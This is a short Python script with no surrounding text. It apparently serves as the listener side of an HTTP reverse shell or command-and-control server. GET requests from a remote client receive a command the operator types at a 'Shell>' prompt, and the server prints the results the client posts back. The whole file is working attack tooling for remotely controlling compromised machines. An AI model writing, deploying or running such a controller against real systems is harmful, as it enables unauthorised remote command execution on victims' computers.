from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs
import subprocess

class MyHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        command = input("Shell> ")
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(bytes(command, "utf-8"))

    def do_POST(self):
        content_length = int(self.headers["Content-Length"])
        post_data = self.rfile.read(content_length).decode("utf-8")
        post_data = parse_qs(post_data)
        print(post_data["result"][0])
        self.send_response(200)
        self.end_headers()

server = HTTPServer(("0.0.0.0", 8080), MyHandler)
server.serve_forever()
